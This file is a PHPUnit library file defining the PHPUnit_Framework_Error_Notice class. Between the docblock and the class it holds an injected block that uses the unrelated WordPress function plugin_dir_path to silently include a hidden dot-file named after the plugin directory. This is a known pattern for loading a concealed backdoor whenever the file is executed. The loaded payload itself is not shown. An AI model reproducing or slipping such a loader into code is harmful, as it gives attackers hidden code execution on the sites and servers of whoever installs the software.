<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Wrapper for PHP notices.
 * You can disable notice-to-exception conversion by setting
 *
 * <code>
 * PHPUnit_Framework_Error_Notice::$enabled = false;
 * </code>
 *
 * @since Class available since Release 3.3.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHPUnit_Framework_Error_Notice extends PHPUnit_Framework_Error
{
    public static $enabled = true;
}
